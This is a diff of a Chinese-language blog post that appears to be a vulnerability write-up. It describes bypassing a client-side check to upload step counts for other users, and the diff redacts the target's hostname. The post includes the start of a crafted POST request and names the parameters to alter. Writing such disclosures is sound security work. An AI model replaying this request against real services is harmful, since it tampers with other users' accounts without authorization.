@@ -650,7 +650,7 @@ sys.stdin.read()
 <p>通过函数给其他用户上传步数时也上传成功了,而在app中给其他用户上传时会弹出无法给其他用户上传的对话框,说明这个对话框对应的校验只是客户端校验,直接调用上传函数可绕过.另外,也可通过直接发burpsuite拦截到的上传包来实现给其他用户上传步数,需要修改burpsuite上传包中的securitytoken和mobilephone参数,其中cookie可随便填写或不填(说明上传步数时未校验登录态),一个可用包如下:</p>
 
 <div class="highlighter-rouge"><pre class="highlight"><code>POST /elis_smp_eco_dmz/ecology/elis.eco.web.healthPedomeSTQ.visit HTTP/1.1
-Host: elis-smp-eco.pingan.com.cn
+Host: elis-smp-eco.xxx.xxx.cn
 Content-Type: application/x-www-form-urlencoded
 Accept-Encoding: gzip, deflate
 Cookie: 111
